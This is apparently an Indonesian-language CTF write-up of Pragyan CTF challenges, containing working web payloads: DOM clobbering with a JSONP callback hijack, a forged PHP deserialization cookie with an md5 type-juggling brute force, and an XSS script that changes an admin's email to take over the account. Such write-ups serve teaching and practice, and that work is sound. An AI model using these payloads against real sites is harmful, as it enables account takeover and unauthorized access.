# Web
## Quotify - web
Pada chalenge ini kita akan diberikan html yang merupakan interface dari halaman admin seperti berikut:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Quotify</title>
</head>
<body>
    <!-- Get user feedback and quote_id from server and display it here for admin -->
    <div class="feedback"></div> <!-- const clean = purify.sanitize(feedback, {FORBID_TAGS: ['math']) -->
    <div class="quote_id"></div>
</body>
<script>
    window.FRUITS = window.FRUITS || {
        bananas: false,
        apples: false,
        oranges: false
    } 
    
    function sus(info){
        if(document.cookie.has_flag){
            console.log("Hmmmmm");  
            if(FRUITS.bananas) {
                console.log("Got flag woohooo. Pretty simple right?");
            }
        }
    }

    function formatQuote(data){
        let quote_content = document.querySelector('.quote-content')
        if(quote_content == undefined){
            quote_content = document.createElement('div')
            quote_content.classList.add('quote-content')
            document.body.appendChild(quote_content)
        }
        let quote = document.querySelector('.quote')
        if(quote == undefined){
            quote = document.createElement('div')
            quote.classList.add('quote')
            quote_content.insertBefore(quote, document.querySelector('.author'))
        }
        quote.innerHTML = data.quote;

        let author = document.querySelector('.author')
        if(author == undefined){
            author = document.createElement('div')
            author.classList.add('author')
            quote_content.appendChild(author, document.querySelector('.quote'))
        }
        author.innerHTML = data.author;
    }
    
    function getQuote(){
        let temp_script = document.createElement('script')
        const quote_id = document.querySelector('.quote_id').innerHTML
        temp_script.src  = `http://bred.delta24.live/quotes/${quote_id}?callback=formatQuote`
        temp_script.id = 'jsonp'
        let old_script = document.getElementById('jsonp')
        if(old_script == undefined) {
            document.body.appendChild(temp_script)
        }
        else {
            old_script.replaceWith(temp_script)
        }

    }
    
    getQuote()

    
</script>
</html>
```

Disini dia menggunakan dompurify di bagian `feedback`, di source code di atas juga ada fungsi `sus` yang merupakan fungsi untuk mendapatkan flagnya (tipikal soal ret2win), tetapi ada beberapa variable yang harus kita bypass, yaitu `cookie.has_flag`, dan `FRUITS.bananas`

```js
        if(document.cookie.has_flag){
            console.log("Hmmmmm");  
            if(FRUITS.bananas) {
                console.log("Got flag woohooo. Pretty simple right?");
            }
        }
```

Disini kita bisa membypass nya menggunakan payload domclobering seperti berikut.

```html
<a id=FRUITS name=bananas><a id="FRUITS"><form name=cookie><input id=has_flag>
```
Jangan lupa kita masukkan payload `1?callback=sus#` untuk mengganti return address ke address `sus`.

Kita kirim semua payload diatas seperti dibawah, dan kita akan mendapatkan flagnya.

![](https://i.imgur.com/aMYUBkh.png)

![](https://i.imgur.com/bEcOYnl.png)

## Lerdof’s Records - web
Pada challenge ini kita akan diberikan url website dimana dalam website ini kita bisa mengakses source code dengaan menyelipkan `.phps`, misal kita bisa melihat source code dari `index.php` dengan mengakses `index.phps`.

![](https://i.imgur.com/WI1qgAW.png)

Pada gambar diatas kita akan melihat `classes.php` sekarang kita akan mengakses source codenya.

```php 
<?php 
    error_reporting(0);
    include('../includes/flag.php');

    class Validate {
        public $key;
    }

    class Admin {
        private $name;
        private $secret1;
        private $secret2;

        function __construct($name, $secret1, $secret2){
            $this->name = $name;
            $this->secret1 = $secret1;
            $this->secret2 = $secret2;
        }
        function __wakeup(){
            if(strlen($this->name) == 10 &&
            strcmp($this->name, "admin") &&
            $this->secret1 === $this->secret2 &&
            md5($this->secret2->key) == 23) {
            print FLAG;
            }
        }
    }

    class User {
        private $name;
        private $password;
        function __construct($name, $password){
            $this->name = $name;
            $this->password = $password;
        }

        function __wakeup(){
            if($this->name === "Jaiden" && $this->password === "cool_password_yo")
                include('../includes/user_files.php');
            else{
                setcookie('user', false);
                header("Location: index.php");
                die();
            }
        }
    }
?>
```

Pada source code diatas kita kita akan melihat class admin, yang dimana disitu terdapat `FLAG`.

Disini kita bisa melakukan deserialization di bagian cookie user seperti yang terdapat pada source code index.php.

Kita akan mendapatkan flag dengan membypass restriksi berikut yang ada di class admin.

```php 
        function __wakeup(){
            if(strlen($this->name) == 10 &&
            strcmp($this->name, "admin") &&
            $this->secret1 === $this->secret2 &&
            md5($this->secret2->key) == 23) {
            print FLAG;
            }
        }
```

Berikut script yang saya buat untuk membuat cookie untuk mendapatkan flagnya.

```php
<?php
class Validate
{
    public $key;
}
class Admin
{
    private $name;
    private $secret1;
    private $secret2;

    function __construct($name, $secret1, $secret2)
    {
        $this->name = $name;
        $this->secret1 = $secret1;
        $this->secret2 = $secret2;
    }
}


$secret2 = new Validate();
$secret2->key = 916; // found after bruteforcing using the same version of php (7.4.33)
$myObj = new Admin("admin\0\0\0\0\0", $secret2, $secret2);
$sereal = serialize($myObj);
print base64_encode($sereal) . "\n";

```

output:

![](https://i.imgur.com/CIaOv3U.png)

Untuk bruteforce type jugling saya menggunakan script berikut:

```php 
<?php

$i = 0;
while (true){
    $i++;
    $md = md5($i);
    if ($md == 23){
        print($i);
        break;
    }
}
```

Jangan lupa untuk merunnya di php versi `7.4.33` karena tidak akan bisa di versi yang terbaru.

![](https://i.imgur.com/T7snZKD.png)

Kita masukkan cookie yang sudah kita forge tadi, dan kita akan mendapatkan flagnya.

![](https://i.imgur.com/qQEq2PB.png)

## Page of Turmoil

### Description
I am making an online private library kinda thing with a cool bot that takes pictures of websites (I don't know why). It is a work in progress and I added some personal notes to the collection a minute after adding the public notes. Read it if you can.

P.S. Surely don't check /pass for the password.

https://pages.ctf.pragyan.org/

### Exploitation
Pada challenge ini kita diberikan website yang di dalamnya ada bot yang akan mengscreens shoot url yang kita berikan.

![](https://i.imgur.com/UVjAwBG.png)

![](https://i.imgur.com/paxzo06.png)

Dalam url `/pass` kita akan menemukan password. Tetapi password itu tertimbun dengan kata lorem ipsum. Kita bisa mencari password yang sesuai dengan menginputkan url berikut `https://pages.ctf.pragyan.org/pass#:~:text=password`

Kita akan menemukan password yang terselip diantara lorem ipsum seperti berikut.

![](https://i.imgur.com/oqpkC26.png)

Untuk referensi trick tersebut saya cantumkan link ini https://book.hacktricks.xyz/pentesting-web/xs-search#image-lazy-loading

Setelah mendapatkan password yaitu `dfjhasdklfjhakbdjfbljas` kita bisa gunakan untuk login ke website.

Setelah ke login kita akses page `/search` dan inputkan seperti berikut untuk mendapatkan flagnya.

![](https://i.imgur.com/tJ0LiPA.png)

## RPS - web
### Description
Maybe the "admin" holds the secret to winning Rock, Paper, Scissors against the computer. In order to hide it, they keep checking the leaderboard every minute, keeping track of the top players and taking caution against them.

Beat them at their own game.

https://rps.ctf.pragyan.org/

### Exploit
Pada challenge ini kita perlu meng-eksploitasi vulnerability xss yang ada di username kita.

Masukkan payload berikut untuk mengganti email admin ke email kita.

```html
<script>
    fetch("/email", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        credentials: "include",
        body: "newEmail=youremail@gmail.com"
    }).then(() => {
        fetch("/pass", {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            credentials: "include",
        })
    })
</script>
```

![](https://i.imgur.com/nbiXqZR.png)

Setelah itu kita akan mendapatkan password admin di email kita.

![](https://i.imgur.com/V54D31A.png)

Login menggunakan credensial admin. dan nanti kita akan mendapatkan flagnya seperti berikut.

![](https://i.imgur.com/D2vkCfn.png)

# Misc
## Got You
[https://gotyou.ctf.pragyan.org/](https://gotyou.ctf.pragyan.org/ "https://gotyou.ctf.pragyan.org/")

- download salah 1 file
- buka audacity > switch to spectogram > split clip yang ada bunyi morsenya
- Split Stereo to Mono biar bisa di decode morsenya
- decode di https://databorder.com/transfer/morse-sound-receiver/ atau pake morse-audio-decoder biar bisa jalan di CLI
- result = GOTCHARICKROLLEDYOU 
- transform dari uppercase ke lowercase 

```
echo "GOTCHARICKROLLEDYOU" | tr '[:upper:]' '[:lower:]' `gotcharickrolledyou
```

- didapat url https://gotyou.ctf.pragyan.org/gotcharickrolledyou 
- download file https://gotyou.ctf.pragyan.org/rickroll.wasm
- baca data didalam strings rickroll.wasm
- decode base64nya

```
echo 'YWxlcnQoJ0NvbmdyYXRzLiBIZXJlIGlzIHlvdXIgZmxhZzogcF9jdGZ7YzBtYkluNHRpMG5fMGZfRDRBX20wcnMzYzBkM18xc19mdTR9Jyk7' | base64 -d alert('Congrats. Here is your flag: p_ctf{c0mbIn4ti0n_0f_D4A_m0rs3c0d3_1s_fu4}');
```

# External
chall archive: [https://drive.google.com/file/d/11ciruVZ39G3Bi4Y1rKHcpYLl3Q86gyg4/view?usp=share_link](https://drive.google.com/file/d/11ciruVZ39G3Bi4Y1rKHcpYLl3Q86gyg4/view?usp=share_link "https://drive.google.com/file/d/11ciruVZ39G3Bi4Y1rKHcpYLl3Q86gyg4/view?usp=share_link")

